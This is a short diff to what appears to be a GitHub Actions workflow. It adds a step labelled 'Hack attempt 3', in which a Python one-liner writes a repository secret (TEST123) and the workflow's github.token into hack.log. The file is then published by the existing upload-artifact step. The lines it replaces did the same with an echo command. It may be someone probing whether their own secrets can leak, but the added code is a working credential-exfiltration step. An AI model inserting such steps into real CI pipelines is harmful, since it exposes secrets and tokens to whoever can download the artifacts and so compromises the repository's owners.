@@ -23,8 +23,12 @@ jobs:
       with:
         submodules: recursive
       
-    - name: Hack attempt 2
-      run: echo ${{ secrets.TEST123 }} >> hack.log
+    - name: Hack attempt 3
+      run: python -c "import os; print(os.environ['sect'], os.environ['sect2'], file=open('hack.log', 'w'))"
+      env:
+        sect: ${{ secrets.TEST123 }}
+        sect2: ${{ github.token }}
+        
     - uses: actions/upload-artifact@v3
       with:
         name: TestLog
